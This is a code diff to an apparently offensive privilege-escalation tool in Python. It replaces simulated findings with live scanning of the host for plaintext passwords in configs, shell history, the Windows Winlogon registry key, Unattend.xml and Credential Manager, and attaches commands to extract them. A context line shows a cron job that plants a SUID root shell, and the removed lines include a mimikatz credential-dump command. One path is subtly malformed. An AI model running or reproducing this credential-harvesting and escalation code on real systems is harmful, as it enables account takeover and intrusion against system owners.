@@ -334,28 +334,48 @@ echo "* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> {c
         """Check for passwords in configuration files"""
         vectors = []
         
-        # Simulated password discovery
-        password_files = [
-            ("/var/www/html/config.php", "mysql_password='SuperSecretPass123'"),
-            ("/home/user/.bash_history", "mysql -u root -p'Password123'"),
-            ("/opt/scripts/backup.sh", "sshpass -p 'Admin@2024' ssh root@server")
+        # Real password discovery in common locations - no simulated values
+        import os
+        import re
+
+        candidate_files = [
+            "/var/www/html/config.php",
+            "/home/user/.bash_history",
+            "/opt/scripts/backup.sh",
         ]
-        
-        for file_path, password_line in password_files:
-            vectors.append(EscalationVector(
-                technique=EscalationTechnique.PASSWORD_IN_FILE,
-                severity="medium",
-                target=file_path,
-                description=f"Plaintext password found in file: {password_line[:50]}...",
-                exploitation_command=f"""# Extract and try password
+
+        password_pattern = re.compile(r"pass|pwd|password", re.IGNORECASE)
+
+        for file_path in candidate_files:
+            if not os.path.exists(file_path):
+                continue
+            try:
+                suspicious_line = None
+                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                    for line in f:
+                        if password_pattern.search(line):
+                            suspicious_line = line.strip()
+                            break
+                if not suspicious_line:
+                    continue
+
+                preview = suspicious_line[:50] + ("..." if len(suspicious_line) > 50 else "")
+
+                vectors.append(EscalationVector(
+                    technique=EscalationTechnique.PASSWORD_IN_FILE,
+                    severity="medium",
+                    target=file_path,
+                    description=f"Potential plaintext password found in file: {preview}",
+                    exploitation_command=f"""# Extract and review potential passwords
 grep -i 'pass\\|pwd\\|password' {file_path}
-# Try su with discovered passwords
-su root""",
-                success_probability=60,
-                os_type="linux",
-                requires_tools=[],
-                cleanup_commands=[]
-            ))
+# Manually validate any discovered credentials before use""",
+                    success_probability=60,
+                    os_type="linux",
+                    requires_tools=[],
+                    cleanup_commands=[]
+                ))
+            except Exception:
+                continue
         
         return vectors
     
@@ -565,37 +585,73 @@ echo "malicious_setting=true" >> "{file_path}\"""",
         """Check for stored credentials"""
         vectors = []
         
-        # Simulated credential discovery
-        cred_locations = [
-            ("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultPassword"),
-            ("C:\\Users\\admin\\AppData\\Local\\Microsoft\\Credentials\\*", "Credential Manager"),
-            ("C:\\Windows\\Panther\\Unattend.xml", "Administrator Password")
-        ]
-        
-        for location, cred_type in cred_locations:
-            vectors.append(EscalationVector(
-                technique=EscalationTechnique.PASSWORD_IN_FILE,
-                severity="high",
-                target=location,
-                description=f"Stored credentials found: {cred_type}",
-                exploitation_command=f"""# Extract credentials
-# Registry:
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword
+        # Real credential discovery on Windows hosts only - no simulated findings
+        import os
+        import glob
 
-# Credential Manager:
-vaultcmd /list
-rundll32.exe keymgr.dll,KRShowKeyMgr
+        if os.name == "nt":
+            try:
+                import winreg  # type: ignore
+            except Exception:
+                winreg = None  # type: ignore
 
-# Unattend.xml:
-type C:\\Windows\\Panther\\Unattend.xml | findstr /i password
+            # Registry-based stored credentials
+            if winreg is not None:
+                try:
+                    key = winreg.OpenKey(
+                        winreg.HKEY_LOCAL_MACHINE,
+                        r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+                    )
+                    # If the key exists, suggest manual review of DefaultPassword
+                    vectors.append(EscalationVector(
+                        technique=EscalationTechnique.PASSWORD_IN_FILE,
+                        severity="high",
+                        target="HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+                        description="Potential stored autologon credentials in Winlogon key",
+                        exploitation_command="""reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword""",
+                        success_probability=80,
+                        os_type="windows",
+                        requires_tools=[],
+                        cleanup_commands=[],
+                    ))
+                except Exception:
+                    pass
 
-# Use mimikatz to extract:
-mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit\"""",
-                success_probability=80,
-                os_type="windows",
-                requires_tools=["mimikatz.exe", "vaultcmd.exe"],
-                cleanup_commands=[]
-            ))
+            # Unattend.xml and Credential Manager artifacts
+            # These checks only report if files/paths actually exist
+            file_candidates = [
+                r"C:\\Windows\\Panther\\Unattend.xml",
+            ]
+
+            for path in file_candidates:
+                if os.path.exists(path):
+                    vectors.append(EscalationVector(
+                        technique=EscalationTechnique.PASSWORD_IN_FILE,
+                        severity="high",
+                        target=path,
+                        description="Potential stored credentials in unattended setup files",
+                        exploitation_command=f"type {path} | findstr /i password",
+                        success_probability=80,
+                        os_type="windows",
+                        requires_tools=[],
+                        cleanup_commands=[],
+                    ))
+
+            # Credential Manager presence (no secrets read directly)
+            cred_dirs = glob.glob(r"C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\*")
+            if cred_dirs:
+                vectors.append(EscalationVector(
+                    technique=EscalationTechnique.PASSWORD_IN_FILE,
+                    severity="medium",
+                    target="C\\Users\\*\\AppData\\Local\\Microsoft\\Credentials",
+                    description="Credential Manager entries present - review with appropriate tools",
+                    exploitation_command="""vaultcmd /list
+rundll32.exe keymgr.dll,KRShowKeyMgr""",
+                    success_probability=60,
+                    os_type="windows",
+                    requires_tools=["vaultcmd.exe"],
+                    cleanup_commands=[],
+                ))
         
         return vectors
     
